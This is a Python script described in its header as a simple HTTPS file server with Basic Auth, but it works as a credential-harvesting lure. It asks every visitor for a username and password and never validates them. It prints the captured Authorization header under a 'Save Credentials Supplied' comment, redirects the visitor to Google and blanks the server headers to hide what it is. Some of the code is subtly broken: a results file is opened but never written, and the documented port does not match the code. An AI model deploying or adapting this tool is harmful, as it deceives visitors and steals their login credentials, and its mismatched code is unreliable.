#!/usr/bin/env python
#
#       Author:            Chase Schultz
#       Handle:            f47h3r
#       Date:            03/31/2018
#       Description:        Python SimpleHTTPServer Served over HTTPS with Basic Auth
#
#     Usage:
#
#               A Lets Encrypt TLS certificate can be generated with the following commands:
#
#                   sudo certbot certonly --register-unsafely-without-email --standalone -d <domain_name>
#                   sudo cat /etc/letsencrypt/live/<domain_name>/fullchain.pem > server.pem
#                   sudo cat /etc/letsencrypt/live/<domain_name>/privkey.pem >> server.pem
#
#               Alternatively a self signed certificate can be generated with the following command:
#
#                   openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
#
#               Generate Basic Auth Key:
#
#                   echo -n "<username>:<password>" | base64
#
#         Run as follows:
#
#                   python simple-https-server_basic-auth.py
#
#         In your browser, visit:
#
#                   https://localhost:4443
#
import os
import ssl
import logging
import http.server
from base64 import b64decode
# Logging Setup
logging.basicConfig(filename='simple.log', level=logging.DEBUG)
logger = logging.getLogger()


class BasicAuthHandler(http.server.SimpleHTTPRequestHandler):
    # Basic Auth Key ( !!Change Me!! -- admin/admin )
    key = 'thisdoesntmatter'
    def do_HEAD(self):
        '''Send Headers'''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
    def do_AUTHHEAD(self):
        '''Send Basic Auth Headers'''
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic')
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        
    def do_REDIRECT(self):
        self.send_response(302)
        self.send_header('Location','https://www.google.com')
        self.end_headers()
    def do_GET(self):
        '''Handle GET Request'''
        try:
            if self.headers.get('Authorization') is None:
                # Send Auth Headers
                self.do_AUTHHEAD()
                logger.debug('Auth Header Not Found')
                self.wfile.write(bytes('Unauthorized', 'utf8'))
            # Save Credentials Supplied
            file = open("webresults.txt", "a")
            print(self.headers.get('Authorization') + '\n')
            file.close()
            self.do_REDIRECT()
        except Exception:
            logger.error("Error in GET Functionality", exc_info=True)
    def date_time_string(self, time_fmt='%s'):
        return ''
    def log_message(self, format, *args):
        '''Requests Logging'''
        logger.debug("%s - - [%s] %s" % (
            self.client_address[0],
            self.log_date_time_string(),
            format % args))

if __name__ == '__main__':
    # Create Handler Instance
    handler = BasicAuthHandler
    # Spoof Server Header ( !!Change Me!! )
    handler.server_version = ' '
    handler.sys_version = ''
    # SimpleHTTPServer Setup
    httpd = http.server.HTTPServer(('0.0.0.0', 8445), handler)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
    try:
        if not os.path.isdir('./files'):
            os.makedirs('./files')
        os.chdir('./files')
        print("Running")
        httpd.serve_forever()
    except Exception:
        logger.error("Fatal error in main loop", exc_info=True)
